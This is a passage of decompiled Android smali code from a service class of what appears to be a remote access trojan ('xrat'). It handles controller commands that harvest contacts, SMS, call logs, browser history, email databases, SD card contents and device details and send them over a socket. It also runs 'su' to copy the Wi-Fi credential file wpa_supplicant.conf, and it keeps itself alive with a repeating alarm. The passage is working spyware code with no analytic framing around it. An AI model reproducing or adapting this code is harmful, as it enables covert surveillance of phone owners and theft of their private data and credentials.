    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/v1/a/a;->a(Ljava/lang/String;)V

    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_23

    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v4

    const-wide/16 v6, 0x0

    cmp-long v2, v4, v6

    if-nez v2, :cond_24

    :cond_23
    const/16 v2, 0xf0

    const-string v3, "\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u6587\u4ef6\u8def\u5f84."

    invoke-static {v3}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v3

    array-length v3, v3

    const-string v4, "\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u6587\u4ef6\u8def\u5f84."

    invoke-static {v4}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    move/from16 v0, v16

    invoke-static {v2, v0, v3, v4}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_24
    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v2

    new-instance v4, Lcom/v1/g;

    move-object/from16 v0, p0

    invoke-direct {v4, v0, v3, v2}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v4}, Lcom/v1/g;->start()V

    goto/16 :goto_0

    :cond_25
    sget-short v2, Lcom/google/xrat/protocol/Protocol;->DO_GET_EMAIL:S

    if-ne v3, v2, :cond_27

    new-instance v2, Lcom/v1/lib/c;

    invoke-direct {v2}, Lcom/v1/lib/c;-><init>()V

    invoke-virtual {v2}, Lcom/v1/lib/c;->a()Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/io/File;

    const-string v4, "/data/data/com.v1/emailAccount.txt"

    invoke-direct {v3, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/16 v5, 0x0

    cmp-long v3, v3, v5

    if-eqz v3, :cond_26

    new-instance v3, Lcom/v1/g;

    const-string v4, "/data/data/com.v1/emailAccount.txt"

    move-object/from16 v0, p0

    invoke-direct {v3, v0, v4, v2}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v3}, Lcom/v1/g;->start()V

    new-instance v3, Lcom/v1/g;

    const-string v4, "/data/data/com.v1/email.html"

    move-object/from16 v0, p0

    invoke-direct {v3, v0, v4, v2}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v3}, Lcom/v1/g;->start()V

    new-instance v3, Lcom/v1/g;

    const-string v4, "/data/data/com.v1/email.db"

    move-object/from16 v0, p0

    invoke-direct {v3, v0, v4, v2}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v3}, Lcom/v1/g;->start()V

    new-instance v3, Lcom/v1/g;

    const-string v4, "/data/data/com.v1/emailbody.db"

    move-object/from16 v0, p0

    invoke-direct {v3, v0, v4, v2}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v3}, Lcom/v1/g;->start()V

    goto/16 :goto_0

    :cond_26
    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/emailAccount.txt"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/email.html"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/email.db"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/emailbody.db"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    const/16 v2, 0xf4

    const-string v3, "\u6ca1\u6709\u8bbe\u7f6e\u90ae\u7bb1\u7528\u6237"

    invoke-static {v3}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v3

    array-length v3, v3

    const-string v4, "\u6ca1\u6709\u8bbe\u7f6e\u90ae\u7bb1\u7528\u6237"

    invoke-static {v4}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    move/from16 v0, v16

    invoke-static {v2, v0, v3, v4}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_27
    sget-short v2, Lcom/google/xrat/protocol/Protocol;->DO_BROWER_HISTORY:S

    if-ne v3, v2, :cond_28

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v2

    invoke-static/range {p0 .. p0}, Lcom/v1/lib/h;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v4, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "\u00a7"

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0xf7

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    array-length v4, v4

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v2

    move/from16 v0, v16

    invoke-static {v3, v0, v4, v2}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_28
    sget-short v2, Lcom/google/xrat/protocol/Protocol;->DO_SAVE_ALL:S

    if-ne v3, v2, :cond_2e

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/lang/String;->getBytes()[B

    move-result-object v20

    move-object/from16 v0, v20

    array-length v2, v0

    int-to-short v0, v2

    move/from16 v21, v0

    new-instance v2, Lcom/google/xrat/protocol/ClientInfo;

    const-string v3, ""

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->b()Ljava/lang/String;

    move-result-object v4

    invoke-static {}, Lcom/v1/lib/j;->i()[Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    aget-object v5, v5, v6

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->a()Ljava/lang/String;

    move-result-object v6

    sget-object v7, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->c()Ljava/lang/String;

    move-result-object v8

    invoke-static {}, Lcom/v1/lib/j;->g()Ljava/lang/String;

    move-result-object v9

    invoke-static {}, Lcom/v1/lib/j;->j()Ljava/lang/String;

    move-result-object v10

    sget-object v11, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-static {}, Lcom/v1/lib/j;->i()[Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x1

    aget-object v12, v12, v13

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->f()Ljava/lang/String;

    move-result-object v13

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->e()Ljava/lang/String;

    move-result-object v14

    invoke-static {}, Lcom/v1/lib/j;->k()Ljava/lang/String;

    move-result-object v15

    invoke-direct/range {v2 .. v15}, Lcom/google/xrat/protocol/ClientInfo;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v3, Lcom/google/xrat/protocol/ClientInfoPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/ClientInfoPacket;-><init>(Lcom/google/xrat/protocol/ClientInfo;)V

    const/16 v2, 0xe3

    invoke-virtual {v3}, Lcom/google/xrat/protocol/ClientInfoPacket;->build()[B

    move-result-object v3

    move/from16 v0, v21

    move-object/from16 v1, v20

    invoke-static {v2, v0, v1, v3}, Lcom/google/xrat/a/b;->a(SS[B[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    invoke-static/range {p0 .. p0}, Lcom/v1/lib/b;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v2

    new-instance v3, Lcom/google/xrat/protocol/ContactsPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/ContactsPacket;-><init>(Ljava/util/ArrayList;)V

    const/16 v2, 0xe0

    invoke-virtual {v3}, Lcom/google/xrat/protocol/ContactsPacket;->build()[B

    move-result-object v3

    move/from16 v0, v21

    move-object/from16 v1, v20

    invoke-static {v2, v0, v1, v3}, Lcom/google/xrat/a/b;->a(SS[B[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    invoke-static/range {p0 .. p0}, Lcom/v1/lib/l;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v2

    new-instance v3, Lcom/google/xrat/protocol/SmsPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/SmsPacket;-><init>(Ljava/util/ArrayList;)V

    const/16 v2, 0xe1

    invoke-virtual {v3}, Lcom/google/xrat/protocol/SmsPacket;->build()[B

    move-result-object v3

    move/from16 v0, v21

    move-object/from16 v1, v20

    invoke-static {v2, v0, v1, v3}, Lcom/google/xrat/a/b;->a(SS[B[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    invoke-static/range {p0 .. p0}, Lcom/v1/lib/a;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v2

    new-instance v3, Lcom/google/xrat/protocol/CallLogsPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/CallLogsPacket;-><init>(Ljava/util/ArrayList;)V

    const/16 v2, 0xe2

    invoke-virtual {v3}, Lcom/google/xrat/protocol/CallLogsPacket;->build()[B

    move-result-object v3

    move/from16 v0, v21

    move-object/from16 v1, v20

    invoke-static {v2, v0, v1, v3}, Lcom/google/xrat/a/b;->a(SS[B[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    invoke-static/range {p0 .. p0}, Lcom/v1/lib/h;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0xf5

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v2

    move/from16 v0, v21

    move-object/from16 v1, v20

    invoke-static {v3, v0, v1, v2}, Lcom/google/xrat/a/b;->a(SS[B[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    new-instance v2, Lcom/v1/lib/f;

    move-object/from16 v0, p0

    invoke-direct {v2, v0}, Lcom/v1/lib/f;-><init>(Landroid/content/Context;)V

    sget-boolean v2, Lcom/v1/StreamService;->e:Z

    if-nez v2, :cond_29

    new-instance v2, Landroid/media/MediaRecorder;

    invoke-direct {v2}, Landroid/media/MediaRecorder;-><init>()V
    :try_end_8
    .catch Ljava/net/SocketException; {:try_start_8 .. :try_end_8} :catch_0
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_2
    .catch Ljava/lang/RuntimeException; {:try_start_8 .. :try_end_8} :catch_4
    .catch Ljava/net/ConnectException; {:try_start_8 .. :try_end_8} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_8 .. :try_end_8} :catch_3
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    const/4 v3, 0x1

    :try_start_9
    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    const-string v3, "/data/data/com.v1/temp.amr"

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->prepare()V

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->start()V

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    const/4 v2, 0x0

    new-instance v3, Ljava/io/File;

    const-string v4, "/data/data/com.v1/temp.amr"

    invoke-direct {v3, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->delete()Z
    :try_end_9
    .catch Ljava/lang/RuntimeException; {:try_start_9 .. :try_end_9} :catch_7
    .catch Ljava/net/SocketException; {:try_start_9 .. :try_end_9} :catch_0
    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_2
    .catch Ljava/net/ConnectException; {:try_start_9 .. :try_end_9} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_9 .. :try_end_9} :catch_3
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    :cond_29
    :goto_6
    :try_start_a
    new-instance v2, Lcom/v1/lib/e;

    invoke-direct {v2}, Lcom/v1/lib/e;-><init>()V

    invoke-virtual {v2}, Lcom/v1/lib/e;->a()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/v1/g;

    move-object/from16 v0, p0

    move-object/from16 v1, v16

    invoke-direct {v3, v0, v2, v1}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v3}, Lcom/v1/g;->start()V

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    const-string v3, "su"

    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    const-string v2, "/data/misc/wifi/wpa_supplicant.conf"

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v3

    add-int/lit8 v3, v3, 0x1

    invoke-virtual {v2, v3}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "/data/data/com.v1/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Lcom/v1/a/a;

    invoke-direct {v4}, Lcom/v1/a/a;-><init>()V

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "cat "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, " > "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/v1/a/a;->a(Ljava/lang/String;)V

    new-instance v2, Lcom/v1/a/a;

    invoke-direct {v2}, Lcom/v1/a/a;-><init>()V

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "chmod 777 "

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/v1/a/a;->a(Ljava/lang/String;)V

    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_2a

    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v4

    const-wide/16 v6, 0x0

    cmp-long v2, v4, v6

    if-nez v2, :cond_2c

    :cond_2a
    const/16 v2, 0xf0

    const-string v3, "\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u6587\u4ef6\u8def\u5f84."

    invoke-static {v3}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v3

    array-length v3, v3

    const-string v4, "\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u6587\u4ef6\u8def\u5f84."

    invoke-static {v4}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    move/from16 v0, v21

    invoke-static {v2, v0, v3, v4}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    :goto_7
    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    new-instance v2, Lcom/v1/lib/c;

    invoke-direct {v2}, Lcom/v1/lib/c;-><init>()V

    invoke-virtual {v2}, Lcom/v1/lib/c;->a()Z

    move-result v2

    if-eqz v2, :cond_2b

    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/emailAccount.txt"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v2

    const-wide/16 v4, 0x0

    cmp-long v2, v2, v4

    if-eqz v2, :cond_2d

    new-instance v2, Lcom/v1/g;

    const-string v3, "/data/data/com.v1/emailAccount.txt"

    move-object/from16 v0, p0

    move-object/from16 v1, v16

    invoke-direct {v2, v0, v3, v1}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/v1/g;->start()V

    new-instance v2, Lcom/v1/g;

    const-string v3, "/data/data/com.v1/email.html"

    move-object/from16 v0, p0

    move-object/from16 v1, v16

    invoke-direct {v2, v0, v3, v1}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/v1/g;->start()V

    new-instance v2, Lcom/v1/g;

    const-string v3, "/data/data/com.v1/email.db"

    move-object/from16 v0, p0

    move-object/from16 v1, v16

    invoke-direct {v2, v0, v3, v1}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/v1/g;->start()V

    new-instance v2, Lcom/v1/g;

    const-string v3, "/data/data/com.v1/emailbody.db"

    move-object/from16 v0, p0

    move-object/from16 v1, v16

    invoke-direct {v2, v0, v3, v1}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/v1/g;->start()V

    :cond_2b
    :goto_8
    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    goto/16 :goto_0

    :catch_7
    move-exception v3

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    goto/16 :goto_6

    :cond_2c
    new-instance v2, Lcom/v1/g;

    move-object/from16 v0, p0

    move-object/from16 v1, v16

    invoke-direct {v2, v0, v3, v1}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/v1/g;->start()V

    goto :goto_7

    :cond_2d
    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/emailAccount.txt"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/email.html"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/email.db"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/emailbody.db"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    const/16 v2, 0xf4

    const-string v3, "\u6ca1\u6709\u8bbe\u7f6e\u90ae\u7bb1\u7528\u6237"

    invoke-static {v3}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v3

    array-length v3, v3

    const-string v4, "\u6ca1\u6709\u8bbe\u7f6e\u90ae\u7bb1\u7528\u6237"

    invoke-static {v4}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    move/from16 v0, v21

    invoke-static {v2, v0, v3, v4}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto :goto_8

    :cond_2e
    sget-short v2, Lcom/google/xrat/protocol/Protocol;->DO_GET_SDCARD:S

    if-ne v3, v2, :cond_2f

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/v1/lib/e;

    invoke-direct {v3}, Lcom/v1/lib/e;-><init>()V

    invoke-virtual {v3}, Lcom/v1/lib/e;->a()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Lcom/v1/g;

    move-object/from16 v0, p0

    invoke-direct {v4, v0, v3, v2}, Lcom/v1/g;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v4}, Lcom/v1/g;->start()V

    goto/16 :goto_0

    :cond_2f
    if-nez v3, :cond_3

    const/4 v2, 0x0

    sput-boolean v2, Lcom/v1/StreamService;->g:Z

    invoke-direct/range {p0 .. p0}, Lcom/v1/StreamService;->d()V
    :try_end_a
    .catch Ljava/net/SocketException; {:try_start_a .. :try_end_a} :catch_0
    .catch Ljava/io/IOException; {:try_start_a .. :try_end_a} :catch_2
    .catch Ljava/lang/RuntimeException; {:try_start_a .. :try_end_a} :catch_4
    .catch Ljava/net/ConnectException; {:try_start_a .. :try_end_a} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_a .. :try_end_a} :catch_3
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_6

    goto/16 :goto_1

    :catch_8
    move-exception v2

    invoke-virtual {v2}, Ljava/lang/RuntimeException;->printStackTrace()V

    goto/16 :goto_1
.end method

.method public final b()Ljava/net/Socket;
    .locals 1

    iget-object v0, p0, Lcom/v1/StreamService;->h:Ljava/net/Socket;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 7

    const-wide/32 v4, 0x2bf20

    const/4 v2, 0x0

    sput-object p0, Lcom/v1/StreamService;->c:Lcom/v1/StreamService;

    new-instance v1, Landroid/content/Intent;

    const-string v0, "android.intent.action.STREAM_FUCK360_HEART_BEAT"

    invoke-direct {v1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Lcom/v1/StreamService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    iput-object v0, p0, Lcom/v1/StreamService;->k:Landroid/app/AlarmManager;

    const/high16 v0, 0x8000000

    invoke-static {p0, v2, v1, v0}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iput-object v0, p0, Lcom/v1/StreamService;->l:Landroid/app/PendingIntent;

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v0

    add-long v2, v0, v4

    iget-object v0, p0, Lcom/v1/StreamService;->k:Landroid/app/AlarmManager;

    const/4 v1, 0x2

    iget-object v6, p0, Lcom/v1/StreamService;->l:Landroid/app/PendingIntent;

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    const-string v0, "StreamService"

    const-string v1, "\u670d\u52a1\u542f\u52a8\u6210\u529f! \u542f\u52a8\u5b9a\u65f6"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    invoke-virtual {p0}, Lcom/v1/StreamService;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    const-string v1, "getAll.dat"

    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    invoke-static {p0}, Lcom/v1/lib/b;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    invoke-static {p0}, Lcom/v1/lib/l;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    invoke-static {p0}, Lcom/v1/lib/a;->a(Landroid/content/Context;)Ljava/util/ArrayList;

    new-instance v0, Lcom/v1/lib/f;

    invoke-direct {v0, p0}, Lcom/v1/lib/f;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/v1/StreamService;->e:Z

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v1, "su"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_1
    .catch Ljava/lang/IllegalStateException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    :goto_0
    invoke-direct {p0}, Lcom/v1/StreamService;->c()V

    new-instance v0, Lcom/v1/f;

    invoke-direct {v0, p0}, Lcom/v1/f;-><init>(Lcom/v1/StreamService;)V

    invoke-virtual {v0}, Lcom/v1/f;->start()V

    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/IllegalStateException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    :catch_2
    move-exception v0

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 2

    iget-object v0, p0, Lcom/v1/StreamService;->k:Landroid/app/AlarmManager;

